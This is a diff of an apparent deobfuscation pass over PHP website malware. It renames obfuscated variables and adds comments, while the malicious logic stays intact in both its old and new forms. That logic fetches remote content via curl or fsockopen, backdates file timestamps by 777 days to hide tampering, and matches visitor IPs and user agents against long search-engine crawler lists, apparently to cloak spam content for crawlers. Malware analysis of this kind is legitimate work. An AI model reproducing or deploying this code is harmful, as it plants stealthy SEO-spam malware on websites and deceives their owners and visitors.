@@ -13,7 +13,7 @@ urlgz=[0:6~10]/^[0:6~10]-[1:4~6][0:2]-!/|[0:6~12]/^[0:6~12]-![0:1]-[0:8~10]/|[0:
 ';
 
 
-$bb66b6b6b = array("soprts","esolc_lruc","tfihsnu_yarra","tini_lruc","nepof","enifed","stsixe_elif","euqinu_yarra","soprrts","yarra_ni","mirt","redaeh","emitmelif","tilps_gerp","edocedlru","pop_yarra","yarra_si","ciremun_si","liec","lla_hctam_gerp","tcartxe","ftnirps","egnar","stegf","eikooctes","foef","egrem_yarra","tnuoc","stnetnoc_teg_elif","rewolotrts","emitotrts","emaner","dro","tpotes_lruc","5dm","sopirts","emanybtsohteg","rhc","edolpxe","timil_emit_tes","emit","elffuhs","ezilairesnu","rddaybtsohteg","domhc","cexe_lruc","sehsalscdda","esolcf","etad","troba_resu_erongi","gnol2pi","hctam_gerp","trats_bo","etirwf","stsixe_noitcnuf","dnar_yarra","elif_si","hcuot","rtrts","ecalper_rts","rtsbus","lru_esrap","ecalper_gerp","nelrts","edocnelru","dnar_tm","edolpmi","ofniphp");
+//$bb66b6b6b = array("soprts","esolc_lruc","tfihsnu_yarra","tini_lruc","nepof","enifed","stsixe_elif","euqinu_yarra","soprrts","yarra_ni","mirt","redaeh","emitmelif","tilps_gerp","edocedlru","pop_yarra","yarra_si","ciremun_si","liec","lla_hctam_gerp","tcartxe","ftnirps","egnar","stegf","eikooctes","foef","egrem_yarra","tnuoc","stnetnoc_teg_elif","rewolotrts","emitotrts","emaner","dro","tpotes_lruc","5dm","sopirts","emanybtsohteg","rhc","edolpxe","timil_emit_tes","emit","elffuhs","ezilairesnu","rddaybtsohteg","domhc","cexe_lruc","sehsalscdda","esolcf","etad","troba_resu_erongi","gnol2pi","hctam_gerp","trats_bo","etirwf","stsixe_noitcnuf","dnar_yarra","elif_si","hcuot","rtrts","ecalper_rts","rtsbus","lru_esrap","ecalper_gerp","nelrts","edocnelru","dnar_tm","edolpmi","ofniphp");
 
 
 
@@ -115,12 +115,11 @@ function l11b68x($l1W){
 $bbbb66b6 = file_get_contents(__FILE__);
 //$bbbb66b6 = file_get_contents("obs.txt");
 
-// <Insert long> $b6b66b = ..
-// Solve function l1FLe62h
 
 
 // Save in seperate file
 include 'long.php';
+// $b6b66b = ..
 
 // Decode phrase
 foreach($b6b66b as $i=>$cipher){
@@ -171,10 +170,8 @@ function l13C3($l1ihTM1){
 }
 */
 
+/* Download file using curl/fsockopen/pfsockopen */
 function l1O2($l14kn,$l1U4n=0,$l1kqFWwO=1,$l1ss2z=null,$l1ms=array()){
-
-    //echo "curl_init" . "\n";
-    //echo "Call me";
 
     $l1Hi = 0;
     if(function_exists(curl_init) && function_exists(curl_exec)){
@@ -203,7 +200,7 @@ function l1O2($l14kn,$l1U4n=0,$l1kqFWwO=1,$l1ss2z=null,$l1ms=array()){
 
         if($func != ''){
             $l16LhCLJ=parse_url($l14kn);
-            $l1vY = $func($l16LhCLJ["host"],isset($l16LhCLJ["port"])?$l16LhCLJ["port"]:80,$l19rmur2,$l1wLOnRg,30);
+            $l1vY = $func($l16LhCLJ["host"],isset($l16LhCLJ["port"]) ? $l16LhCLJ["port"] : 80,$l19rmur2,$l1wLOnRg,30);
             if($l1vY){
                 $l1Hi=isset($l16LhCLJ["path"])?$l16LhCLJ["path"]:'';
                 $l1Hi.=isset($l16LhCLJ["query"])?'?'.$l16LhCLJ["query"]:'';
@@ -221,18 +218,17 @@ function l1O2($l14kn,$l1U4n=0,$l1kqFWwO=1,$l1ss2z=null,$l1ms=array()){
                 $l1Hi=0;
             }
         }else{
-            $l1Hi=file_get_contents($l14kn);
+            $l1Hi = file_get_contents($l14kn);
         }
     }
     return trim(trim($l1Hi,"\xEF\xBB\xBF"));
 }
 
-function l1AZ($l1OB09n='',$l1Au7aJz=false){
-    $l1zYgg17="googlebot|baiduspider|bingbot|google|baidu|aol|bing|yahoo";
-    if($l1Au7aJz){
-        $l1zYgg17.="|Mozilla";
-    }
-    return preg_match("/($l1zYgg17)/si",$l1OB09n);
+/* Check if user agent matches */
+function l1AZ($input='',$test_mode=false){
+    $agents = "googlebot|baiduspider|bingbot|google|baidu|aol|bing|yahoo";
+    if($test_mode) $agents.="|Mozilla";
+    return preg_match("/($agents)/si",$input);
 }
 
 function l1Qw8rL($l15sT8Q=''){
@@ -305,9 +301,7 @@ function l1J($l1A='',$l1Ckl=false,$l1dQ=1,$l1dah=''){
 
 /* Change file timestamp */
 function l1uKK($file){
-    if(file_exists($file)){
-        @touch($file,strtotime("-777 days"));
-    }
+    if(file_exists($file)) @touch($file,strtotime("-777 days"));
 }
 
 function l1TMU($l17DkaPB){
@@ -372,7 +366,7 @@ function l1Rc6HvA($l1ucnnn,$l13aW=1){
     foreach($l1rPS2cy as $l1k8){
         $l1ucnnn = str_replace($l1k8,sprintf($l17Ek,'\\',$l1k8),$l1ucnnn);
     }
-    return$l1ucnnn;
+    return $l1ucnnn;
 }
 
 function l1spc7n9($l1WD,$l1Vx,$l1iiC,$l1J){
@@ -422,7 +416,7 @@ function l1guW($l1GjNWID,$l1MC8=0){
         }
         $l1r=$l1GH0rfZ["url_prefix_qm"]?preg_replace("/QMQM/","%3F",$l1r):$l1r;
     }
-    return$l1Z4k.($l1MC8?$l1r:"$l1r$l1m{$l1GjNWID[3]}<");
+    return $l1Z4k.($l1MC8?$l1r:"$l1r$l1m{$l1GjNWID[3]}<");
 }
 
 function l1kohsP($l1C=array(),$l1zoXNve=0){
@@ -458,66 +452,77 @@ function l1g1oAl2($l1a,$l1qu2H,$l113,$l1V=0){
             }
         }
     }
-    return$l1yc8E;
+    return $l1yc8E;
 }
 
-function l1S(){
-    $l1n41HS=array("HTTP_CDN_SRC_IP","HTTP_PROXY_CLIENT_IP","HTTP_WL_PROXY_CLIENT_IP","HTTP_CLIENT_IP","HTTP_X_FORWARDED_FOR","REMOTE_ADDR",);
-    $l1z="unknown";
+/* Get user IP from header */
+function get_user_IP(){
+    $keys = array("HTTP_CDN_SRC_IP","HTTP_PROXY_CLIENT_IP","HTTP_WL_PROXY_CLIENT_IP","HTTP_CLIENT_IP","HTTP_X_FORWARDED_FOR","REMOTE_ADDR",);
+    $IP = "unknown";
 
-    foreach($l1n41HS as$l1Ud){
-        if(!empty($_SERVER[$l1Ud])&&strtolower($_SERVER[$l1Ud])!="unknown"){
-            $l1z=$_SERVER[$l1Ud];
+    foreach($keys as $key){
+        if(!empty($_SERVER[$key]) && strtolower($_SERVER[$key])!="unknown"){
+            $IP = $_SERVER[$key];
             break;
         }
     }
-    return $l1z;
+    return $IP;
 }
 
 function l1gVD2yX(){
-$l16I=@strtolower($_SERVER["HTTP_USER_AGENT"]);
-if($l16I=="yuantuobot"){
-return true;
-}if(strpos(@strtolower($_SERVER["HTTP_REFERER"]),"translate")!=false){
-return false;
-}
-$l13P=$l1jccWg=l1S();
-if(($l1lDxHoB=ip2long($l1jccWg))<0){
-$l1lDxHoB+=4294967296;
-}
-$l16k=array(array(3639549953,3639558142),
-            array(1089052673,1089060862),
-            array(1123635201,1123639294),
-            array(1208926209,1208942590),
-            array(3512041473,3512074238),
-            array(1113980929,1113985022),
-            array(1249705985,1249771518),
-            array(1074921473,1074925566),
-            array(3481178113,3481182206),array(2915172353,2915237886),array(2850291712,2850357247),array(1823129600,1823145983),array(1823539200,1823571967),array(2398748672,2398879743),array(2899902464,2899967999),array(2902261760,2902327295),array(2915172352,2915237887),array(3232890880,3233021951),array(3344429056,3344430079),array(3481178112,3481182207),array(3487539200,3487543295),array(3518562304,3518627839),array(3512041472,3512074239),array(3639549952,3639558143),array(3625975808,3626237951),array(3627728896,3627737087),array(1074921472,1074925567),array(1089052672,1089060863),array(1078214656,1078222847),array(1113980928,1113985023),array(1123631104,1123639295),array(1176535040,1176543231),array(1180172288,1180434431),array(1208926208,1208942591),array(1249705984,1249771519),array(134217728,150994943),array(1081896984,1081896991),array(2159111488,2159111679),array(2159128096,2159128111),array(3468331392,3468331283),array(3459234728,3459234735),array(3475195328,3475195391),array(3494556048,3494556063),array(3522775360,3522775367),array(1062518496,1062518527),array(1081575648,1081575655),array(1081927080,1081927087),array(1082183584,1082183599),array(1074918400,1074918431),array(1103424288,1103424303),array(1104396896,1104396911),array(1104572512,1104572543),array(1104609120,1104609135),array(1105036720,1105036735),array(1105135664,1105135679),array(1119913504,1119913519),array(1132356616,1132356623),array(1180359472,1180359479),array(1180359496,1180359503),array(3518589952,3518590207),
-            array(3518627072,3518627327),array(3512069632,3512069887),array(3639550208,3639550463),array(3639551232,3639551487),array(3639551842,3639551843),array(3639552352,3639552355),array(3639553280,3639553535),array(3639553536,3639553791),array(3639554912,3639556963),array(3626100131,3626100131),array(1089056193,1089056255),array(1078218752,1078219007),array(1078219008,1078219263),array(1078219264,1078219519),array(1078219520,1078219775),array(1078219776,1078220031),array(1078220032,1078220287),array(1078220288,1078220543),array(1078220544,1078220799),array(1078220800,1078221055),array(1078221056,1078221311),array(1078221313,1078221567),array(1078221568,1078221823),array(1078221824,1078222079),array(1123631104,1123631359),array(1123631360,1123631615),array(1123631616,1123631871),array(1123631872,1123632127),array(1123632128,1123632383),array(1123632384,1123632639),array(1123632640,1123632895),array(1123632896,1123633151),array(1123633152,1123633407),array(1123633408,1123633663),array(1123634688,1123634943),array(1123634944,1123635199),array(1208928000,1208928000),array(134623232,134623487),array(1123634176,1123634431),array(1089052672,1089060863),array(1113980928,1113985023),array(1123631104,1123639295),array(1208926208,1208942591),array(1249705984,1249771519),array(3512041472,3512074239),array(3639549952,3639558143),array(3639550208,3639550463),array(3639550720,3639550975),array(3639551232,3639551487),
-            array(3639551744,3639551999),array(3639554816,3639555071),array(3639555328,3639555583),array(3639555840,3639556095),array(3639556352,3639556607),array(3639556864,3639557119),array(1089052928,1089053183),array(1089060096,1089060351),array(1113983744,1113983999),array(1113982720,1113982975),array(1113983232,1113983487),array(1123631104,1123631359),array(1123631360,1123631615),array(1123631616,1123631871),array(1123632896,1123633151),array(1123633152,1123633407),array(1208930048,1208930303),array(1089060096,1089060351),array(1113983744,1113983999),array(1113982720,1113982975),array(1113983232,1113983487),array(1123631104,1123631359),array(1123631360,1123631615),array(1123631616,1123631871),array(1123632896,1123633151),array(1123633152,1123633407),array(1208930048,1208930303),array(3639550208,3639550463),array(3639550720,3639550975),array(3639551232,3639551487),array(3639551744,3639551999),array(3639554816,3639555071),array(3639555328,3639555583),array(3639555840,3639556095),array(3639556352,3639556607),array(3639556864,3639557119),array(1123631360,1123631615),array(1123632128,1123632383),array(1123632896,1123633151),array(3419421696,3419421951),array(3729389312,3729389567),array(1090060288,1090125823),array(1078394880,1078460415));
+    $user_agent = @strtolower($_SERVER["HTTP_USER_AGENT"]);
 
-foreach($l16k as$l1GRsXVC){
-    if($l1lDxHoB>=$l1GRsXVC[0]&&$l1lDxHoB<=$l1GRsXVC[1]){
-        return true;
+    if($user_agent == "yuantuobot") return true;
+
+    if(strpos(@strtolower($_SERVER["HTTP_REFERER"]),"translate") != false){
+        return false;
     }
-}
 
-$l1SHW=array(134217728,150994943,1062518496,1062518527,1074918400,1074918431,1074921472,1074925567,1078214656,1078222847,1081575648,1081575655,1081896984,1081896991,1081927080,1081927087,1082183584,1082183599,1089052672,1089060863,1103424288,1103424303,1104396896,1104396911,1104572512,1104572543,1104609120,1104609135,1105036720,1105036735,1105135664,1105135679,1113980928,1113985023,1119913504,1119913519,1123631104,1123639295,1132356616,1132356623,1176535040,1176543231,1180172288,1180359472,1180359479,1180359496,1180359503,1180434431,1208926208,1208942591,1249705984,1249771519,1823129600,1823145983,1823539200,1823571967,2159111488,2159111679,2159128096,2159128111,2398748672,2398879743,2899902464,2899967999,2902261760,2902327295,2915172352,2915237887,3232890880,3233021951,3344429056,3344430079,3459234728,3459234735,3468331392,3468331455,3475195328,3475195391,3481178112,3481182207,3487539200,3487543295,3494556048,3494556063,3512041472,3512074239,3518562304,3518627839,3522775360,3522775367,3625975808,3626237951,3627728896,3627737087,3639549952,3639558143);
+    $user_IP = get_user_IP();
 
-foreach($l1SHW as $l1jccWg){
-    if($l1lDxHoB==$l1jccWg){
-        return true;
+    /* Convert IPv4 to long integer */
+    if(($IP_long = ip2long($user_IP))<0){
+        $IP_long += 4294967296;
     }
-}
 
-$l1VaP419=array("googlebot","bingbot","slurp","msnbot","jeeves","teoma","crawler","spider");
-foreach($l1VaP419 as$l1a){
-    if(strpos($l16I,$l1a)!==false){
-        return l1n($l13P,$l16I);
+    /* IP ranges */
+    $IP_range = array(array(3639549953,3639558142),
+                array(1089052673,1089060862),
+                array(1123635201,1123639294),
+                array(1208926209,1208942590),
+                array(3512041473,3512074238),
+                array(1113980929,1113985022),
+                array(1249705985,1249771518),
+                array(1074921473,1074925566),
+                array(3481178113,3481182206),
+                array(2915172353,2915237886),
+                array(2850291712,2850357247),
+                array(1823129600,1823145983),
+                array(1823539200,1823571967),array(2398748672,2398879743),array(2899902464,2899967999),array(2902261760,2902327295),array(2915172352,2915237887),array(3232890880,3233021951),array(3344429056,3344430079),array(3481178112,3481182207),array(3487539200,3487543295),array(3518562304,3518627839),array(3512041472,3512074239),array(3639549952,3639558143),array(3625975808,3626237951),array(3627728896,3627737087),array(1074921472,1074925567),array(1089052672,1089060863),array(1078214656,1078222847),array(1113980928,1113985023),array(1123631104,1123639295),array(1176535040,1176543231),array(1180172288,1180434431),array(1208926208,1208942591),array(1249705984,1249771519),array(134217728,150994943),array(1081896984,1081896991),array(2159111488,2159111679),array(2159128096,2159128111),array(3468331392,3468331283),array(3459234728,3459234735),array(3475195328,3475195391),array(3494556048,3494556063),array(3522775360,3522775367),array(1062518496,1062518527),array(1081575648,1081575655),array(1081927080,1081927087),array(1082183584,1082183599),array(1074918400,1074918431),array(1103424288,1103424303),array(1104396896,1104396911),array(1104572512,1104572543),array(1104609120,1104609135),array(1105036720,1105036735),array(1105135664,1105135679),array(1119913504,1119913519),array(1132356616,1132356623),array(1180359472,1180359479),array(1180359496,1180359503),array(3518589952,3518590207),
+                array(3518627072,3518627327),array(3512069632,3512069887),array(3639550208,3639550463),array(3639551232,3639551487),array(3639551842,3639551843),array(3639552352,3639552355),array(3639553280,3639553535),array(3639553536,3639553791),array(3639554912,3639556963),array(3626100131,3626100131),array(1089056193,1089056255),array(1078218752,1078219007),array(1078219008,1078219263),array(1078219264,1078219519),array(1078219520,1078219775),array(1078219776,1078220031),array(1078220032,1078220287),array(1078220288,1078220543),array(1078220544,1078220799),array(1078220800,1078221055),array(1078221056,1078221311),array(1078221313,1078221567),array(1078221568,1078221823),array(1078221824,1078222079),array(1123631104,1123631359),array(1123631360,1123631615),array(1123631616,1123631871),array(1123631872,1123632127),array(1123632128,1123632383),array(1123632384,1123632639),array(1123632640,1123632895),array(1123632896,1123633151),array(1123633152,1123633407),array(1123633408,1123633663),array(1123634688,1123634943),array(1123634944,1123635199),array(1208928000,1208928000),array(134623232,134623487),array(1123634176,1123634431),array(1089052672,1089060863),array(1113980928,1113985023),array(1123631104,1123639295),array(1208926208,1208942591),array(1249705984,1249771519),array(3512041472,3512074239),array(3639549952,3639558143),array(3639550208,3639550463),array(3639550720,3639550975),array(3639551232,3639551487),
+                array(3639551744,3639551999),array(3639554816,3639555071),array(3639555328,3639555583),array(3639555840,3639556095),array(3639556352,3639556607),array(3639556864,3639557119),array(1089052928,1089053183),array(1089060096,1089060351),array(1113983744,1113983999),array(1113982720,1113982975),array(1113983232,1113983487),array(1123631104,1123631359),array(1123631360,1123631615),array(1123631616,1123631871),array(1123632896,1123633151),array(1123633152,1123633407),array(1208930048,1208930303),array(1089060096,1089060351),array(1113983744,1113983999),array(1113982720,1113982975),array(1113983232,1113983487),array(1123631104,1123631359),array(1123631360,1123631615),array(1123631616,1123631871),array(1123632896,1123633151),array(1123633152,1123633407),array(1208930048,1208930303),array(3639550208,3639550463),array(3639550720,3639550975),array(3639551232,3639551487),array(3639551744,3639551999),array(3639554816,3639555071),array(3639555328,3639555583),array(3639555840,3639556095),array(3639556352,3639556607),array(3639556864,3639557119),array(1123631360,1123631615),array(1123632128,1123632383),array(1123632896,1123633151),array(3419421696,3419421951),array(3729389312,3729389567),array(1090060288,1090125823),array(1078394880,1078460415));
+
+    foreach($IP_range as $range){
+        if($IP_long>=$range[0] && $IP_long<=$range[1]){
+            return true;
+        }
     }
-}
-return false;
+
+    /* IP whitelist */
+    $IP_whitelist = array(134217728,150994943,1062518496,1062518527,1074918400,1074918431,1074921472,1074925567,1078214656,1078222847,1081575648,1081575655,1081896984,1081896991,1081927080,1081927087,1082183584,1082183599,1089052672,1089060863,1103424288,1103424303,1104396896,1104396911,1104572512,1104572543,1104609120,1104609135,1105036720,1105036735,1105135664,1105135679,1113980928,1113985023,1119913504,1119913519,1123631104,1123639295,1132356616,1132356623,1176535040,1176543231,1180172288,1180359472,1180359479,1180359496,1180359503,1180434431,1208926208,1208942591,1249705984,1249771519,1823129600,1823145983,1823539200,1823571967,2159111488,2159111679,2159128096,2159128111,2398748672,2398879743,2899902464,2899967999,2902261760,2902327295,2915172352,2915237887,3232890880,3233021951,3344429056,3344430079,3459234728,3459234735,3468331392,3468331455,3475195328,3475195391,3481178112,3481182207,3487539200,3487543295,3494556048,3494556063,3512041472,3512074239,3518562304,3518627839,3522775360,3522775367,3625975808,3626237951,3627728896,3627737087,3639549952,3639558143);
+
+    foreach($IP_whitelist as $IP){
+        if($IP_long == $IP) return true;
+    }
+
+    $bots = array("googlebot","bingbot","slurp","msnbot","jeeves","teoma","crawler","spider");
+
+    foreach($bots as $bot){
+        if(strpos($user_agent,$bot)!==false){
+            return l1n($user_IP,$user_agent);
+        }
+    }
+    return false;
 }
 
 function l1n($l12,$l1uiO){
@@ -617,10 +622,10 @@ function l1RnVra($l1P=0,$l1X='3~5',$l108=-1){
 
 function l19($l1SDKs){
     global $l1Ni6,$l1go;
-    $l1Nt=str_replace("$l1SDKs/",'',$l1Ni6);
-    $l1BRS=array();
-    $l1O=l1BSTEtn(l1O2($l1SDKs));
-    $l1BRS[]=$l1go;
+    $l1Nt = str_replace("$l1SDKs/",'',$l1Ni6);
+    $l1BRS = array();
+    $l1O = l1BSTEtn(l1O2($l1SDKs));
+    $l1BRS[] = $l1go;
 
     foreach($l1O as$l184039L){
         $_SERVER["REQUEST_URI"]="/$l184039L";
